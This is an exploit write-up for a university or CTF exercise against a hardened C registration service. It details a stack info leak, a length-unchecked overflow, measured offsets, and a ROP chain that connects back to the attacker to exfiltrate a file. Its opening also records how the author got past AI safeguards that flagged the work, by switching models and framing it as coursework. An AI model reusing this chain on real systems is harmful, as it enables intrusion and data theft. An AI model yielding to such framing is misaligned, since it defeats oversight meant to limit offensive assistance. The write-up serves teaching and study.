# canary-in-a-cage — Exploit Write-up

## TL;DR
Claude did most of the work for me. Since I had an idea on how the exploit chain might
look like and what kind of vulnerabilities to expect i could catch him early, when he
got stuck with certain subtasks.

Claude read the README.md, read the source code, found the vulnerabilities in the source,
chose the right tools (objdump, gdb) to observe the runtime behaviour, read the leaked
canary value for exploiting the ROP Chain and then combined everything in a neat exploit
script which works over multiple restarts of the vulnerable service.

## Models, token usage and observations

The initial session with Claude Opus 5.5 was immeadiately flagged by it's
safeguards. It was necessary to switch to Opus 4.8, but after about 40 minutes
of thinking and the construction of a sort of working exploit, Opus 4.8 was
stopped by it's safeguards aswell. Afterwards Sonnet 5 picked up the previous work
and finished the exploit with the mentioned interventions from §5. At the point
of doing this task I was not part of the cyber security research program
and thus not having any lesser safeguard restrictions. This task was done by pure
"vanilla" Claude sessions, to which any user with a pro account has access to.
The whole process took about 3 hours and burned through ~30% of available session
tokens and roughly ~7% of total available tokens. Claude was not able to give me
exact numbers on this question, so these numbers are an estimated of what i saw
on the gauges.

Opus 4.8 and Sonnet 5 cooperated in this project, due to the granular README.md
and additional input from my side which classified this as a legitimate university task.

**Target:** `user_registration_service` (`service/src/service.c`)
**Mitigations active:** Full RELRO, Stack Canary (`-fstack-protector-strong`), NX, PIE/ASLR, FORTIFY_SOURCE=2, `-fcf-protection=full` (Intel CET markers)

> **Verification status, stated plainly:** The full exploit chain in §4 — leak, overflow, connect-back, and flag exfiltration — has been run end-to-end against a freshly built, freshly started instance of `build/service` (no debugger attached) and confirmed working: the service reads `build/flag.txt` and the contents arrive back at the attacker's listener over the connect-back connection. §3.3's CET-boundary measurement, the information-leak primitive, the overflow offset, and the `close(client_fd)` architectural discovery were all separately confirmed empirically during development, as documented in each respective section and in §5.2.

---

## 1. Environment

| | |
|---|---|
| Distribution | Parrot OS (kernel `7.0.13+parrot7-amd64`) |
| Compiler | `gcc (Debian 14.2.0-19) 14.2.0` |
| libc | `glibc 2.41` (Debian GLIBC 2.41-12+deb13u4) |
| CET hardware support | **None** (`grep -o -E 'shstk|ibt' /proc/cpuinfo` returns empty) |

`checksec` against `build/service`:

```
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
FORTIFY:    Enabled
```

The absence of hardware CET support matters: the `-fcf-protection=full` marker is present in the binary, but with no shadow stack / IBT enforcement on this CPU, plain `ret`-based ROP chaining is unobstructed. On a CET-enforcing machine, this exact technique (bare `pop;ret` gadgets) would be blocked and would need a JOP/COOP-style approach instead — out of scope here, but worth noting as a boundary of this exploit's applicability.

---

## 2. Vulnerabilities Found

Two independent bugs in `service.c`, both reachable without authentication, cooperate to defeat every mitigation in turn.

### 2.0 Working Hypothesis, Formed Before Reading the Source

Before opening `service.c`, the assignment's own framing already narrowed down what to look for:

- **A stack canary that still gets defeated implies a leak, not a bypass.** A canary isn't something an overflow "gets around" blindly — the epilogue's check is a straight equality comparison against a value fixed at process start. If the assignment states outright that the service is exploitable *despite* `-fstack-protector-strong`, the only way that holds is if the canary's value becomes known to the attacker somehow — most plausibly through an independent coding mistake that discloses stack memory it shouldn't, in a code path that need not have anything to do with the overflow itself.
- **The CVE references point at a vulnerability class, not just at precedent.** Section 2 of the assignment describes all three referenced CVEs identically, as "bugs involving client-controlled length values." That phrasing is a direct pointer to the bug *shape* to look for: a client-supplied length field driving a buffer operation with no server-side check against the destination's real size — as opposed to, say, a format-string bug, a type confusion, or an off-by-one.

Both halves of this hypothesis — an independent leak bug, and a client-controlled-length overflow — were confirmed once the source was actually read (§2.1, §2.2). The code review wasn't a blind search for "some vulnerability"; it was targeted at confirming or refuting two specific, pre-formed expectations, which is also why two cooperating bugs (rather than one) were identified quickly: the assignment's structure — the hardening list plus the CVE framing — was already signalling that pairing before any disassembly happened.

### 2.1 Out-of-bounds read in `handle_status()` (`CMD_STATUS`) — info leak

```c
static void handle_status(int client_fd) {
    uint32_t requested_len_net;
    read_all(client_fd, &requested_len_net, sizeof(requested_len_net));
    uint32_t requested_len = ntohl(requested_len_net);
    if (requested_len > STATUS_MSG_CAPACITY)   // capped at 256
        requested_len = STATUS_MSG_CAPACITY;

    char response[64];                          // only 64 bytes!
    size_t text_len = strlen(STATUS_TEXT);       // 19 bytes
    memcpy(response, STATUS_TEXT, text_len);     // only first 19 bytes are ever initialized

    write(client_fd, response, requested_len);   // writes up to 256 bytes
}
```

`response` is a 64-byte stack buffer; only its first 19 bytes are ever written. `requested_len` is checked against `STATUS_MSG_CAPACITY` (256), **not** against `sizeof(response)` (64). A client requesting 256 bytes gets back 19 bytes of real data followed by **192 bytes of uninitialized stack**, verbatim. Because `main()`'s locals are allocated in one large stack frame, this over-read window reaches far enough to include:

- the stack canary,
- a saved libc return address (→ libc base),
- a reusable raw stack pointer value (→ see §3.2),
- assorted other leftover stack content.

One single request gives everything needed to defeat ASLR/PIE and the stack canary in one shot.

### 2.2 Unbounded stack write in `register_user()` (`CMD_REGISTER`) — the primitive

```c
static void register_user(int client_fd) {
    uint32_t name_len_net;
    read_all(client_fd, &name_len_net, sizeof(name_len_net));
    uint32_t name_len = ntohl(name_len_net);     // fully attacker-controlled, no upper bound

    user_profile_t profile;                      // profile.name is char[64]
    profile.is_verified = 0;

    read_all(client_fd, profile.name, name_len); // writes name_len bytes into a 64-byte buffer

    dprintf(client_fd, "Registered user: %.*s\n", (int)name_len, profile.name);
}
```

`name_len` is a client-supplied `uint32_t` with **no bound check** against `MAX_NAME_LEN`/`sizeof(profile.name)` (64 bytes) before being passed to `read_all()`. This is a classic unbounded `read()`-into-fixed-buffer stack overflow — the exact bug class the assignment's CVE references (Sante PACS, Ivanti, CitrixBleed 3) all share: a client-controlled length value driving a buffer operation with no server-side cap.

### 2.3 Why FORTIFY_SOURCE=2 catches neither bug

FORTIFY_SOURCE instruments specific *string/memory* functions (`memcpy`, `sprintf`, `strcpy`, `snprintf`, format-string functions, …) with `_chk` variants when the compiler can statically prove a destination buffer's size via `__builtin_object_size`. Neither vulnerable operation qualifies:

- **`read()` / `write()` have no `_chk` variants in glibc at all.** FORTIFY has no instrumented path for raw I/O syscalls, regardless of whether the buffer's size is known. Both bugs route through exactly these two functions (`handle_status`'s `write()`, and `register_user`'s `read_all()` → `read()`), so FORTIFY is structurally blind to both.
- Even where FORTIFY *is* active here — the compiler does insert `__dprintf_chk` for the `dprintf(..., "%.*s\n", ...)` call (visible in the disassembly) — that check exists to guard against format-string attacks (e.g. a writable/attacker-controlled format string, `%n`), not to bound-check the *source* string's readable length against `profile.name`'s declared size. A `%.*s` with an explicit precision is, by FORTIFY's own model, already "safe" by construction; it has no way to know the precision value itself came from unchecked attacker input further upstream.
- `handle_status`'s `memcpy(response, STATUS_TEXT, text_len)` is provably safe at compile time (`text_len` is `strlen` of a string literal, 19, well under 64) — nothing to flag there either. The actual danger is three lines later, in the `write()` call, which (per the first point) FORTIFY simply doesn't cover.

### 2.4 The structural discovery: `close(client_fd)` fires before the hijack

Disassembling the inlined `register_user` path in `main()` (both handlers get inlined at `-O2`, there are no separate symbols) shows the exit path is:

```
dprintf(...)              ; the "Registered user: ..." echo
jmp  <common exit>
<common exit>:
    close(client_fd)       ; <-- closes fd 4 (THIS connection), unconditionally
    <stack canary check>
    ret                    ; <-- our hijacked return only fires HERE
```

The connection's own socket is closed by the compiled code **before** the function epilogue — and therefore before our overwritten return address ever takes control. This was confirmed empirically: the first exploit iteration (ROP chain reading the attack path and writing the exfiltrated flag back on the *same* connection, fd 4) produced a clean 170-byte response (exactly the `dprintf` echo) and nothing more, on every run, with no crash and no error — consistent with every I/O call targeting fd 4 silently failing (`EBADF`) rather than the chain crashing.

This isn't a bug to "fix" — it's a fixed property of the vulnerable function's compiled control flow, and it rules out same-connection exfiltration entirely. The assignment's own wording anticipates exactly this ("the exfiltration path … is up to you, as long as it is consistent with how the service actually behaves") — the intended solution is a **connect-back**: have the ROP chain open a brand-new outbound connection to the attacker, since fd 4 is a dead end by the time it fires.

---

## 3. Defeating Each Mitigation

| Mitigation | How it's defeated |
|---|---|
| **ASLR / PIE** | §2.1's leak yields a libc return address (→ `libc_base`) and a raw stack value (→ our own overflow buffer's absolute address, see §3.2) on *every* run, fresh. Never hardcoded; recomputed from a live leak each exploit invocation, so it transparently survives server restarts (which get a fresh ASLR base each time). |
| **Stack canary** | Not brute-forced or bypassed — simply read directly out of the same §2.1 leak (it sits a fixed, predictable number of bytes into the over-read) and written back byte-for-byte at the correct offset in the overflow payload. The epilogue's canary check compares the (unmodified) value against the copy saved in TLS at function entry; since all connections are handled by processes `fork()`ed from the same long-lived parent, every child inherits the exact same canary value established once at the parent's own startup — a leak from one connection is valid for a completely different connection's overflow. |
| **NX** | No shellcode is ever placed on the stack or heap. Control flow is redirected purely via Return-Oriented Programming: every instruction executed post-hijack is pre-existing, already-mapped, executable code inside libc (`pop;ret` gadgets chaining into real `socket`/`connect`/`open`/`read`/`write`/`exit`). Nothing we write is ever executed as code. |
| **Full RELRO** | Simply orthogonal to this attack. RELRO protects the GOT from being overwritten after relocation; our technique never touches the GOT at all — it redirects control purely through the stack's saved return address via ret2libc, which RELRO has no bearing on. |
| **FORTIFY_SOURCE=2** | See §2.3 — neither vulnerable code path routes through an instrumented function. |
| **CFI / CET (SHSTK & IBT)** | Compiled in, but inert: the test CPU has no hardware CET support (§1). Plain `ret`-chained ROP is unobstructed here; this is a real boundary of the exploit's applicability, not a bypass of CET itself. |

### 3.1 Empirically-measured constants (this exact build)

All of the following are **fixed properties of this specific compiled binary / libc build** — not ASLR-dependent, measured once, reused every run:

| Constant | Value | How measured |
|---|---|---|
| Canary offset in the `CMD_STATUS` leak | `0x48` | disassembly: canary saved at `main`'s `rsp+0xb8`; `response` buffer at `rsp+0x70` → `0xb8-0x70=0x48` |
| Libc-return-address offset in the leak | `0x78` | disassembly placement of the saved frame; confirmed against `/proc/<pid>/maps` |
| That return address' offset from libc base | `0x29ca8` | empirically matched a leaked value against the parent process' own `/proc/pid/maps` libc base |
| `profile.name` overflow offset to canary | `152` bytes | empirically confirmed: the `dprintf("%.*s", ...)` echo is always exactly 152 `'A'` bytes long before truncating — because the canary's low byte is `0x00` by design, `%.*s` stops there even though the format precision we supply is far larger |
| `profile.name` overflow offset to saved return address | `200` bytes | confirmed via a controlled-crash test: overwriting this exact offset with a `pop rdi; ret` gadget address followed by a sentinel value, the crash core-dump showed `RDI` set to that exact sentinel — proving precise control at this offset |
| Stack-anchor leak offset | `0x58` | observed to be a stable, reproducible raw stack address across independent server restarts (same offset, different ASLR base each time) |
| Stack-anchor → `profile.name` address delta | `0x1D8` | measured via a controlled `gdb` breakpoint session (see §3.2) |

### 3.2 Deriving `profile.name`'s absolute address from the network leak alone

Same-connection exfiltration being closed off (§2.4) requires embedding data (a `sockaddr_in` struct and a file path, see §4) directly inside the overflow payload itself, and referencing it by absolute stack address — which in turn requires knowing where on the stack our own payload bytes land, from nothing but the network-visible leak.

This was derived with a single controlled breakpoint session, using the technique the assignment itself points at ("set a software breakpoint … and read a register value at runtime"):

1. `gdb -q ./build/service`, `set follow-fork-mode child`, `set detach-on-fork off` (needed so the long-lived parent stays attached across multiple forked connections — the default `detach-on-fork on` releases the parent after the *first* fork, which breaks a server handling several sequential connections).
2. Breakpoint at `*main+0x1ba` (register-path-specific, so it doesn't trip on `CMD_STATUS` connections), i.e. the very start of `register_user`'s body — before any further stack adjustment, so `$rsp` there equals the "working" frame pointer used by every `lea N(%rsp), reg` in the function (confirmed from disassembly: `profile.name` address = this `$rsp + 0x20`).
3. Captured `$rsp = 0x7fffffffd6c0` at the breakpoint.
4. In the same process instance, issued a `CMD_STATUS` leak and read the raw value at leak-offset `0x58`: `S = 0x7fffffffd8b8`.
5. `S − $rsp = 0x1F8` ⟹ `profile.name_addr = $rsp + 0x20 = S − 0x1D8`.

This delta is a link-time-fixed relationship between two stack slots in the same function frame — it holds regardless of ASLR base, confirmed stable across multiple independent restarts with different bases. From this point on, no further debugging is needed at exploit time: a single `CMD_STATUS` response yields canary, libc base, *and* the absolute address of our own future overflow buffer, all at once.

### 3.3 Empirical Confirmation of the CET Boundary

Since this exploit is tested on hardware without CET enforcement (§1), the claim that it would specifically be stopped by Intel CET's shadow stack (SHSTK) — and not by IBT — is backed by a direct, live measurement rather than left as a theoretical claim.

**Method.** `CMD_REGISTER` and `CMD_STATUS` share one compiled epilogue (both handlers are inlined into `main()`), ending in a single `ret` at file offset `main+0x1b9`. Immediately before this instruction executes, `$rsp` points exactly at the return-address slot — the same slot a hardware shadow stack's compare microcode would check its own protected copy against. A breakpoint was set exactly there (`gdb`, `set follow-fork-mode child`, `set detach-on-fork off` to keep the long-lived parent attached across both forked connections of one exploit run) and the value at that slot was read with `x/gx $rsp` twice, within the same server instance:

1. During the leak connection (`CMD_STATUS`) — an entirely ordinary, non-malicious request. This slot holds the real, untouched return address.
2. During the overflow connection (`CMD_REGISTER` with the exploit payload) — same slot, same breakpoint, read *after* the overflow has already happened inside `read_all()`, immediately before the corrupted value would be consumed by the `ret`.

**Result, captured live** (gcc 14.2.0 / glibc 2.41, this build, one server instance):

| | value | libc-relative offset |
|---|---|---|
| `R_legit` (ordinary request) | `0x00007ffff7dd6ca8` | `libc_base + 0x29ca8` |
| `R_exploit` (overflow request) | `0x00007ffff7dd7145` | `libc_base + 0x2a145` |
| `libc_base` (this run) | `0x00007ffff7dad000` | — |

Both offsets match exactly what the exploit's own design predicts: `0x29ca8` is the real return address into glibc's startup code — the same value leaked from `CMD_STATUS` offset `0x78` and used throughout §3.1–§4 to compute `libc_base` — while `0x2a145` is the address of the first `pop rdi; ret` gadget the ROP chain plants in that slot. These are two distinct, fixed locations inside libc, `0x49D` bytes apart. The mismatch isn't incidental — it's structurally guaranteed by the exploit's own construction — and this is a direct, live measurement of that mismatch, off the real running process, rather than an inference from static offsets alone.

**Why this specifically implicates SHSTK, not IBT.** A hardware shadow stack maintains its own, write-protected copy of every value pushed by a `call` instruction and compares it against the regular stack's copy on every matching `ret`. `R_legit` is what that protected copy would hold, since nothing on a legitimate request's path ever writes to this slot through anything but the original `call`. `R_exploit` shows the *regular* stack's copy has been successfully rewritten by the overflow — but the shadow stack's protected copy, being unaddressable by ordinary memory writes, would still hold `R_legit`. On real CET hardware, the `ret` at this exact instruction would raise `#CP` (control-protection fault) the moment it tried to pop a value that disagreed with its shadow copy — before transferring control to the first gadget, let alone the rest of the chain. IBT is not engaged at all here, since the technique never performs an indirect `call`/`jmp` to an attacker-chosen target; it is purely `ret`-based.

**Scope of this result.** This demonstrates the *value mismatch* that SHSTK enforcement checks for, captured live off the real running process — not an actual `#CP` fault, since the test CPU (§1) has no CET hardware to raise one. Producing an actual fault would require either genuine CET-capable hardware with full kernel/glibc enablement, or a CET-aware emulator (e.g. QEMU in TCG mode) — both out of scope for this exercise, but the underlying mechanism this result demonstrates is the exact one that would trigger such a fault on hardware that enforces it.

---

## 4. The Exploit Chain

```
Connection 1 (CMD_STATUS, requested_len=256)
  → leak: canary, libc_base, profile.name_addr  (§2.1, §3.1, §3.2)

Connection 2 (CMD_REGISTER, name_len = len(payload))
  payload =
      152× 'A'                              (filler up to the canary)
    + canary                                (leaked value, written back verbatim)
    + 40× 'B'                               (saved rbx/rbp/r12/r13 + padding, don't-care)
    + ROP chain:
        socket(AF_INET, SOCK_STREAM, 0)     -> fd 3   (fd 3 & 4 are both free: server_fd(3)
                                                        and client_fd(4) were already closed, §2.4)
        connect(3, &sockaddr_in, 16)        -> connects back to the attacker's listener
        open(path, O_RDONLY)                -> fd 4   (reads build/flag.txt, relative to the
                                                        service's own CWD, which is service/)
        read(4, scratch, 300)               -> file contents into a libc .bss scratch buffer
        write(3, scratch, 300)              -> exfiltrate over the NEW connection (fd 3)
        exit(0)                             -> clean process teardown (flushes the write
                                                       as a normal FIN instead of risking an RST)
    + embedded data (pure attacker bytes, referenced by absolute address via §3.2):
        sockaddr_in{ AF_INET, attacker_port (network order), attacker_ip, zero-padding }
        "build/flag.txt\0\0"
```

Each `pop reg; ret` gadget consumes exactly two qwords (16 bytes — parity-neutral mod 16), so after the hijack, RSP's alignment mod 16 never changes across however many argument-setup gadgets precede a given call. The x86-64 SysV ABI requires `RSP % 16 == 8` at a real function's entry (what a genuine `call` instruction produces); a lone extra `ret` (one qword, odd) is inserted immediately before every real libc call (`socket`, `connect`, `open`, `read`, `write`, `exit`) to correct this parity. Omitting it was the cause of an earlier failed iteration: the chain crashed on the very first real libc call before producing any output at all.

`fd` bookkeeping is deterministic, not guessed: every child starts from the same baseline (`fd 0,1,2` inherited; `fd 3` = the listening socket, closed early in every child; `fd 4` = this connection's socket, closed by the compiled exit path per §2.4) — so `socket()` reliably returns `3`, and the later `open()` reliably returns `4`.

### Why this is reliable across restarts

The exploit performs the leak fresh, from scratch, at the start of every single invocation. Nothing is hardcoded except the link-time constants in §3.1, which are properties of the *binary*, not of any one *process instance*. Restarting the service produces a new ASLR base for libc, PIE, and the stack — the next exploit run simply leaks against whatever that new base happens to be and computes everything relative to it. The only thing that would invalidate the exploit is rebuilding with a different compiler/libc version (which would shift the measured offsets and gadget addresses) — restarting the same binary does not.

---

## 5. AI Assistance Disclosure, and Where Human Intervention Was Required

Per the assignment's explicit allowance, Claude (Opus and Sonnet, via Claude Code) was used throughout. Documenting where the AI's output was *wrong* and had to be caught, corrected, or re-derived is at least as important as documenting where it helped — §5.2 is a deliberately critical log, not a list of successes.

### 5.1 Where AI assistance was used

- Code/binary audit support: reading `service.c`/`protocol.h`, disassembling the inlined `main()` (both handlers are inlined at `-O2`, so there are no separate symbols to work from).
- Explaining mitigation mechanisms — exactly why FORTIFY_SOURCE catches neither bug (§2.3), why Full RELRO is orthogonal to a ret2libc strategy, and the x86-64 calling-convention/stack-alignment requirement for chaining `pop;ret` gadgets into real libc functions.
- Proposing and iterating the gdb methodology in §3.2.
- Drafting `exploit.py` iteratively, incorporating each measured constant as it was derived.

All offsets, gadget addresses, and the stack-anchor delta in §3.1–3.2 were measured against this specific build (gcc 14.2.0 / glibc 2.41) by actually running the binary and reading live process state — not supplied or guessed by the model in advance, consistent with the assignment's note that "no generic model knows this specific code version and its exact offsets."

### 5.2 Concrete points where the AI was wrong, and human execution/verification is what actually resolved it

| # | What the AI produced or claimed | What was actually true | How the gap was found and closed |
|---|---|---|---|
| 1 | First exploit design: read the attack path and write the exfiltrated flag back over the *same* connection (fd 4) used to trigger the overflow. | The service's compiled exit path unconditionally calls `close(client_fd)` before the hijacked return ever fires — fd 4 is already dead by the time the ROP chain runs (§2.4). | Only found because the exploit was actually built, run against the real binary, and the *exact* observed behavior reported back (a clean 170-byte echo, nothing more, no error) — that specific, precise symptom is what made re-reading the disassembly for a `close()` call worthwhile. |
| 2 | An early draft correctly included a stack-alignment `ret` gadget before the first real libc call. A later edit, misdiagnosing an unrelated issue, **removed** it — a regression presented as a fix. | The gadget was required for ABI-correct 16-byte stack alignment at every real libc call's entry; removing it broke the very first call in the chain. | The "fixed" version was run again and still produced nothing. Only a from-scratch, qword-by-qword trace of RSP parity through the entire chain (forced by having to explain *why* it still failed) surfaced that the earlier removal had been the actual mistake. |
| 3 | Assumed the literal path `"flag.txt"` would resolve correctly. | The service's CWD is `service/`, not `service/build/`; `"flag.txt"` resolved to a nonexistent file, so `open()` failed silently. | Found only after running the exploit and reporting the precise symptom "addresses compute fine, but the flag doesn't come out right" — specific enough to point at a logic/path bug rather than a crash, and distinct from issue #2 above (a second, compounding bug, fixed separately). |
| 4 | Set a PIE breakpoint via the literal, pre-relocation address `*0x131a`. | On a running PIE binary, a bare literal address isn't relocated by gdb the way a symbol reference is; gdb reported "cannot access memory." | Only surfaced by actually typing the command into a real gdb session and pasting the literal error back verbatim. |
| 5 | Instructed `set detach-on-fork off`; the command was typed as `detach-non-fork`. | gdb silently rejected the unrecognized command and kept the dangerous default (`on`), which detaches from the parent process after its very first fork. | Visible only in the verbatim gdb transcript — "No symbol 'detach' in current context" is easy to miss if the output is summarized rather than pasted exactly as shown. |
| 6 | Assumed resuming the parent process after a fork event was as simple as typing `continue`. | `continue` only acts on gdb's *currently selected* inferior; after the first forked child exited, that selection was still the dead child, not the live parent — `inferior 1` had to be selected explicitly first. | Found from the exact gdb output ("The program is not being run") after a `continue` that otherwise looked, by its own wording, like it should have worked. |

None of the six rows above were resolved by better reasoning alone — each one required a human to actually run a real command against the real, running binary and relay back the literal output, including error text, rather than a summary of "it didn't work." For a significant stretch of this engagement, a tool-level restriction also meant the AI could not execute anything itself at all: every gdb command, every exploit run, and every piece of raw evidence behind §3.2's constants exists only because it was executed and relayed, verbatim, by a human.

### 5.3 Where the human's prior reasoning anticipated the AI's later findings

See §2.0 — the hypothesis that a canary-leak bug and a client-controlled-length overflow would both be present was formed *before* the source was read, directly from the assignment's own framing (the hardening list plus the CVE references), independently of and prior to the AI's own bottom-up code analysis in §2.1–2.2. Two independent lines of reasoning — one top-down from the assignment's framing, one bottom-up from the disassembly — converged on the same two bugs.

---


